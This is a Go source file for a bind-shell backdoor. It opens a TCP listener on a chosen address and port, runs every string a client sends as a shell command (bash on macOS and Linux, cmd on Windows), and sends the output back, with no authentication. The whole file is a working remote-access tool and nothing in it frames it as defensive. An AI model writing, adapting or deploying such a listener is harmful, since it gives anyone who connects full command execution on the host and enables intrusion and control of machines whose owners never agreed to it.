package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"sync"
)

var message [128]byte
var lock sync.Mutex

func Receiver(conn net.Conn) {

	for {
		lock.Lock()
		res, err := conn.Read(message[:])
		if err != nil {
			fmt.Println("[+] Read Error", err)
			return
		}
		temp := string(message[:res])
		if runtime.GOOS == "darwin" {
			cmd := exec.Command("/bin/bash", "-c", temp)
			output, err := cmd.CombinedOutput()
			if err != nil {
				errMsg := "[-]Command Error! \n"
				conn.Write([]byte(errMsg))
			}
			fmt.Println(string(output))
			conn.Write([]byte(output))
			lock.Unlock()
		} else if runtime.GOOS == "windows" {
			cmd := exec.Command("cmd", "/C", temp)
			output, err := cmd.CombinedOutput()
			if err != nil {
				errMsg := "[-]Command Error! \n"
				conn.Write([]byte(errMsg))
			}
			fmt.Println(string(output))
			conn.Write([]byte(output))
			lock.Unlock()

		} else {
			cmd := exec.Command("/bin/bash", "-c", temp)
			output, err := cmd.CombinedOutput()
			if err != nil {
				errMsg := "[-]Command Error! \n"
				conn.Write([]byte(errMsg))
			}
			fmt.Println(string(output))
			conn.Write([]byte(output))
			lock.Unlock()
		}

	}
}

func main() {
	if len((os.Args)) > 1 {
		serverAddr := os.Args[1] + ":" + os.Args[2]
		listener, err := net.Listen("tcp", serverAddr)
		if err != nil {
			fmt.Println("[+] 服务端发生错误 ", err)
			return
		}
		for {
			conn, err := listener.Accept()
			if err != nil {
				fmt.Println(err)
				return
			}
			go Receiver(conn)
		}
	} else {
		fmt.Println("[+]Usage: server[.exe] ip listenport")
	}
}
